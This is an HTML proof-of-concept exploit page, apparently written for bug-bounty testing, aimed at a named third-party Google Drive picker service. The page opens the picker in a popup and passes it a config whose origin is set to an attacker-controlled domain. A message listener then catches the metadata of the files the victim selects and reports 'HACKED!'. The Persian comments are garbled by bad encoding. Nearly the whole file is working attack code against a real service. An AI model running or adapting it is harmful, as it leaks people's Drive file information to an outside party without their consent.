<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Front Picker PoC - FIXED</title>
</head>
<body>
  <h2>ğŸ¯ Testing...</h2>
  <pre id="output" style="background:#111;color:#0f0;padding:10px;white-space:pre-wrap;"></pre>

  <script>
  const ATTACKER_ORIGIN = "https://52-hrtz.github.io"; // <<< Ø¯Ø§Ù…Ù†Ù‡ Ø®ÙˆØ¯Øª Ø±Ùˆ Ø§ÛŒÙ†Ø¬Ø§ Ø¨Ø°Ø§Ø±
const PICKER_URL = "https://google-drive-picker.frontapplication.com/google-drive/index.html";

// Ú©Ø§Ù†ÙÛŒÚ¯ Ø­Ù…Ù„Ù‡ (ØªÙ…ÛŒØ²ØŒ Ø¨Ø¯ÙˆÙ† ÙØ§ØµÙ„Ù‡ Ø§Ø¶Ø§ÙÛŒØŒ Ø¨Ø¯ÙˆÙ† authenticatedUserEmail)
const config = {
  googleAppId: "754490832836",
  googleClientId: "754490832836-gs77odllghgisuja5jecijqihaolr08q.apps.googleusercontent.com",
  googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly",
  googleDriveAllowedMimeTypes: "application/vnd.google-apps.document,application/vnd.google-apps.spreadsheet,application/vnd.google-apps.folder",
  origin: ATTACKER_ORIGIN
};

// Ú¯ÙˆØ´ Ø¯Ø§Ø¯Ù† Ø¨Ù‡ Ù¾ÛŒØ§Ù…â€ŒÙ‡Ø§ (Ù‚Ø¨Ù„ Ø§Ø² Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ù¾Ø§Ù¾â€ŒØ¢Ù¾)
window.addEventListener("message", (e) => {
  console.log("ğŸ“¨ [PoC] Message received!", { origin: e.origin, data: e.data });
  if(e.data?.type === "google-documents-selected" && e.data.documents?.length) {
    console.log("ğŸ‰ SUCCESS! File metadata:", e.data.documents[0]);
    alert("âœ… HACKED! Check console for file info");
  }
}, false);

// Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ù¾Ø§Ù¾â€ŒØ¢Ù¾
console.log("ğŸ¯ Opening picker popup...");
const popup = window.open(`${PICKER_URL}?config=${encodeURIComponent(JSON.stringify(config))}`, "picker", "width=700,height=600");

// Ú†Ú© Ú©Ø±Ø¯Ù† ÙˆØ¶Ø¹ÛŒØª opener
setTimeout(() => {
  if(!popup || popup.closed) console.warn("âŒ Popup blocked or closed");
  else {
    // Ú†Ú© Ú©Ù†ÛŒÙ… opener Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯Ø§Ø±Ù‡ ÛŒØ§ Ù†Ù‡
    try {
      const test = popup.window?.opener;
      console.log("ğŸ” window.opener in popup:", test ? "âœ… Accessible" : "âŒ NULL (COOP/noopener?)");
    } catch(err) { console.warn("âš ï¸ Cannot access popup:", err); }
  }
}, 2000);
  </script>
</body>
</html>
